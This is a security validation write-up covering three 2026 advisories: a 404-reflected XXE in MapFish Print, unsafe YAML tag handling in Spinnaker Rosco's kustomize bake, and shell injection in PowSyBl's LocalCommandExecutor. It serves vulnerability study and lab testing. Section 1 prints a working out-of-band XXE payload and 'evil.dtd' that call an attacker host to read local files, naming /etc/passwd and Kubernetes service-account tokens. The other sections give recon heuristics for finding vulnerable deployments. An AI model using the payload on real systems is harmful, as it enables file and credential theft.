# MapFish Print 404-reflected XXE, Spinnaker kustomize-bake YAML tags, and PowSyBl local command executor — operator validation

**Date reviewed:** 2026-08-30
**Primary advisories:** [GHSA-5v29-34h8-v68r / CVE-2026-55848](https://github.com/advisories/GHSA-5v29-34h8-v68r) (high, 8.6), MapFish Print; [GHSA-p68j-q7hf-3qcp](https://github.com/advisories/GHSA-p68j-q7hf-3qcp) (high, 7.5), Spinnaker RO SCO; [GHSA-jqvf-j3ww-r8c7](https://github.com/advisories/GHSA-jqvf-j3ww-r8c7) (high), PowSyBl Core.
**Boundary class:** untrusted content crossing into parse → compile/execute pipelines inside build/render/analysis services — XML entity expansion on an error path, YAML tag handling during kustomize bake, and shell construction from `List<String>` arguments in a Java computation library.

## 1. MapFish Print: 404-reflected OOB XXE against GML layer URLs

MapFish Print fetches a GML layer URL supplied in the print request. The XXE is reachable through the **error path**: when the layer URL 404s, the server expands the entity and throws a default 404 whose response body includes the *full resolved path* — including the OOB entity payload. The result is an out-of-band XXE that reads arbitrary files of certain types (e.g. `/etc/passwd`, Kubernetes service-account tokens and certs) on `print-lib` / `print-servlet` `>= 3.0.0, < 3.28.30` and `>= 3.29.0, < 3.30.32`.

The reusable pattern:

1. Attacker hosts a small XML file (a PHP/any-language endpoint that echoes `<!DOCTYPE x [<!ENTITY % payload SYSTEM "file://<target-path>"> <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"> %dtd;]>` plus a `wfs:FeatureCollection` wrapper).
2. Attacker hosts `evil.dtd`: `<!ENTITY % exfil "<!ENTITY &#37; error SYSTEM 'file:///xxe-exfil/%payload;'>"> %exfil; %error;`
3. A single print request with the attacker XML URL as the GML layer URL.
4. The 404 handler's "file not found: `<expanded path>`" error reflects the exfiltrated content back, and the `file:///xxe-exfil/...` OOB request confirms the primitive without needing the reflected body at all.

Recon heuristic: any server-side XML/GML/GeoJSON/WFS fetcher is an XXE candidate. Test the **error paths** specifically — a `DOCTYPE`-enabled parser that swallows the normal response often still echoes the entity-expanded value inside its 404/500 body. If the product accepts a remote URL for *any* geospatial layer, image source, or report template, the layer URL is the input.

## 2. Spinnaker RO SCO: unsafe YAML tag processing during kustomize bake → pod RCE

RO SCO's kustomize-bake operations process image tags unsafely, which leads to RCE-type exploits on the rosco pods — **only when kustomize is the bake provider**. The advisory's own guidance is to block kustomize operations and use another provider, which is the operational mitigation but also the operator-side check: is kustomize bake enabled on this cluster?

Affected: `rosco-manifests` `< 2025.3.4`, `>= 2025.4.0, < 2025.4.4`, `>= 2026.0.0, < 2026.0.3`.

Recon heuristic: Spinnaker deployments that expose pipeline definitions to non-admins (or where a pipeline-definition write is part of the bug-hunt scope) should enumerate which bake providers are enabled. A kustomize-bake-enabled RO SCO with user-controlled pipeline inputs is the pre-condition; the YAML tag boundary is the trigger.

## 3. PowSyBl Core: `LocalCommandExecutor` shell construction from `List<String>` arguments

Both OS-dependent implementations of `AbstractLocalCommandExecutor` (CWE-78) build command strings via concatenation and execute them through `bash -c` (Unix) or `cmd /c` (Windows). Any string argument or environment-variable value reaching the executor breaks out of the intended command and executes arbitrary shell code as the JVM user. The sink is reachable through **public APIs that accept `List<String>` arguments** with no documented shell-interpretation semantics — the secondary concern is CWE-88 argument injection via environment variables.

Affected: `com.powsybl:powsybl-computation-local` `<= 7.2.1`, fixed in 7.2.2.

Recon heuristic: PowSyBl is a power-system analysis library; the offensive angle is any product that embeds it and feeds user-influenced data (network model identifiers, external-software arguments, solver option names) into its computation-local executor. Enumerate the public `List<String>`-accepting entry points in dependent products and check whether any argument position reaches `LocalCommandExecutor`.

## Replayable validation (lab only)

### MapFish Print 404-reflected XXE

Preconditions: a lab MapFish Print `3.x` in the affected range, an owned callback host (or local HTTP server) for the XML + DTD, and a readable canary file (e.g. a file the service user can read, placed at a known path; on a Kubernetes lab pod, `/var/run/secrets/kubernetes.io/serviceaccount/token` is the documented target — do not use it outside authorized scope).

1. Host the XML endpoint and `evil.dtd` on the owned callback host.
2. Baseline: a print request with a non-XML GML URL → normal error, no entity expansion.
3. Send the print request with the GML layer URL set to the attacker XML endpoint with the target file path attached.
4. Positive: the callback host receives the OOB `file:///xxe-exfil/<canary-content>` request, **or** the 404 response body reflects the expanded path containing the canary. Stop at the canary file — do not read credentials, real secrets, or data beyond the canary.
5. Negative control on 3.28.30 / 3.30.32: the DOCTYPE is rejected or the error path no longer reflects.

### Spinnaker kustomize bake

Preconditions: a lab Spinnaker cluster with RO SCO and kustomize bake enabled, a pipeline-definition write path available to the test identity.

1. Confirm kustomize is the active bake provider (config inspection or a benign bake with a known-good kustomization).
2. Craft a pipeline input that places a canary YAML tag into the image-reference position the advisory identifies; execute the bake in the lab namespace.
3. Positive: the rosco pod executes the tag-embedded instruction (canary marker only). No production cluster, no image pull to external registries, no container escape.
4. Negative control: patched `rosco-manifests` rejects the same input; or kustomize disabled → bake falls to a safe provider.

### PowSyBl local command executor

Preconditions: a JVM lab with `powsybl-computation-local` 7.2.1 on the classpath and direct API access (this is a library-level finding; validation is code-level plus a benign process marker).

1. Call a public `List<String>`-accepting entry point with an argument containing a shell-breakout marker (e.g. an argument that would create a marker file via `bash -c` semantics).
2. Positive: the marker appears where the JVM user can write, proving shell interpretation of `List<String>` elements. No real command execution beyond the marker.
3. Negative control on 7.2.2: the same input is either escaped or the API no longer reaches a shell.
4. Record the exact public API, the argument position, and the OS (`bash -c` vs `cmd /c` path) in the report.

## Safe boundaries

- Lab deployments only, exact product versions pinned for the negative control.
- XXE proofs stop at a canary file and the OOB callback; no credential, secret, or tenant-data reads.
- Spinnaker validation in an isolated lab namespace only; no production pipeline execution, no external registry pulls, no container/host escape.
- PowSyBl validation at the marker-file level only; no real system commands, no environment-variable exfiltration.
- All evidence synthetic and redacted; report the exact input-to-parse-to-execute path with the denied/escaped control.
